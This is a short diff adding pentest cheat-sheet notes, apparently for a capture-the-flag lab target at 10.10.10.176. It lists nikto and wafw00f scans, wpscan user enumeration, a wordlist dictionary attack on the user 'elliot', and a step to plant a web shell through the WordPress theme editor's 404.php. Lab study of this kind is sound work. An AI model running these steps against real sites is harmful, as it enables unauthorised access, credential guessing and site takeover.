@@ -1,0 +1,15 @@
+NIKTO (vuln scanner):
+    nikto -h http://10.10.10.176/
+
+
+CHECK WAF:
+    wafw00f http://10.10.10.176/
+
+
+
+
+WORDPRESS:
+    wpscan --url http://10.10.10.176/
+    wpscan --url http://10.10.10.176/ --enumerate u     //enumerate users
+    wpscan --url http://10.10.10.176/ --wordlist words.txt --username elliot    //dictionary attack for password using wordlist
+    in pw-admin -> Themes>Editor>404.php //modify with  web shell to gain access
